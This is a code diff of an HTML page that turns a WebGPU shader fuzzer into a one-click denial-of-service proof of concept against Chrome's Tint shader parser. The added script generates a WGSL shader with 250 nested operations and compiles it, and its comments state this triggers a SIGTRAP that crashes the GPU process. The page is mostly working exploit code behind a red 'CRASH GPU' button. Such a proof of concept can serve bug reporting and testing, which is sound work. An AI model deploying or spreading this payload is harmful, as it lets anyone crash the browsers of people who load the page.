@@ -1,54 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Crash Catcher</title>
+    <title>WebGPU Tint Parser DoS</title>
 </head>
 <body>
-    <h2>Capturing the SIGTRAP Payload</h2>
-    <button id="fuzzBtn">START</button>
-    <pre id="lastShader" style="background:#222; color:#0f0; padding:10px; font-family:monospace;"></pre>
+    <h2>Tint AST Recursive Depth DoS</h2>
+    <p>Clicking the button will crash the GPU Process.</p>
+    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white;">CRASH GPU</button>
 
     <script>
-        const logEl = document.getElementById('lastShader');
-
-        // Generate deeply nested math
-        function generateDeepMath(depth) {
+        // Generate the exact depth needed to trigger the AST state corruption
+        function generateKillerMath(depth) {
             if (depth <= 0) return "(1.0)";
-            return `(${generateDeepMath(depth - 1)} + vec4<f32>(1.0).x)`;
+            return `(${generateKillerMath(depth - 1)} * vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
         }
 
-        // Generate deeply nested control flow
-        function generateDeepControlFlow(depth) {
-            if (depth <= 0) return `return vec4<f32>(1.0);`;
-            return `if (true) { loop { if (false) { break; } ${generateDeepControlFlow(depth - 1)} } } else { ${generateDeepControlFlow(depth - 1)} }`;
-        }
+        async function triggerCrash() {
+            if (!navigator.gpu) {
+                alert("WebGPU is not supported.");
+                return;
+            }
 
-        function generateEvilShader() {
-            // We use extreme depths to trigger the SIGTRAP again
-            const body = Math.random() > 0.5 
-                ? generateDeepControlFlow(80) 
-                : `let x = ${generateDeepMath(150)}; return vec4<f32>(x);`;
-                
-            return `@vertex fn vs_main() -> @builtin(position) vec4<f32> {\n${body}\nreturn vec4<f32>(1.0);\n}`;
-        }
-
-        async function runFuzzer() {
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
 
-            setInterval(() => {
-                const evilWGSL = generateEvilShader();
-                
-                // SAVE THE SHADER TO THE SCREEN BEFORE COMPILING
-                logEl.innerText = "If Chrome crashes now, copy this shader!\n\n" + evilWGSL;
+            // We generate roughly 250 nested operations.
+            // This is enough to hit the "maximum parser recursive depth reached" 
+            // and trigger the SIGTRAP in CrGpuMain.
+            const killerWGSL = `
+                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
+                    let crazy_var = ${generateKillerMath(250)};
+                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
+                }
+            `;
 
-                try {
-                    device.createShaderModule({ code: evilWGSL });
-                } catch (e) {}
-            }, 100); // Slower so the screen has time to update
+            console.log("Sending payload to Tint...");
+            
+            try {
+                // This call crashes the GPU Process
+                device.createShaderModule({ code: killerWGSL });
+            } catch (e) {
+                console.log("Caught:", e);
+            }
         }
 
-        document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
+        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
     </script>
 </body>
 </html>
